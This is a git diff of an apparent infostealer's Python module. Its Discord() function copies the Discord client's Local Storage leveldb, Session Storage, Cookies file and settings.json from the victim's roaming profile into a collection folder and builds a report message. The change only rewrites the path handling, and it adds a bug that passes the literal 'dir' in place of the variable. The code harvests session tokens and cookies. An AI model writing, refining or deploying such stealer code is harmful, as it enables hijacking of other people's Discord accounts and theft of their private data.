@@ -54,12 +54,12 @@ def Discord():
     msgInfo = ""
     msgInfo+="\n\n\n<b>📬Messagers📬</b>"
     dirs = [
-        r'Local Storage\leveldb',
-        r'Session Storage'
+        "Local Storage\\leveldb",
+        "Session Storage"
         ]
     files= [
-        r"Network\Cookies",
-        r"settings.json"
+        "Network\\Cookies",
+        "settings.json"
     ]
     try:
         Log("===========Messagers===========")
@@ -69,12 +69,12 @@ def Discord():
         makedirs(f'{pathtofile}\\Messengers\\Discord', exist_ok=True)
         for dir in dirs:
             try:
-                copytree(fr"{roaming}\discord\{dir}", f"{pathtofile}\\Messengers\\Discord\\{dir}")
+                copytree(path.join(roaming, "discord", dir), path.join(pathtofile, "Messengers", "Discord", "dir"))
             except Exception as e:
                 Log(f"{dir} DS dirs ---> {e}")
         for file in files:
             try:
-                copy2(fr"{roaming}\discord\{file}",f"{pathtofile}\\Messengers\\Discord")
+                copy2(path.join(roaming, "discord", file) , path.join(pathtofile, "Messengers", "Discord"))
             except Exception as e:
                 Log(f"{file} DS files ---> {e}")
         msgInfo+="\n∟📨Discord"
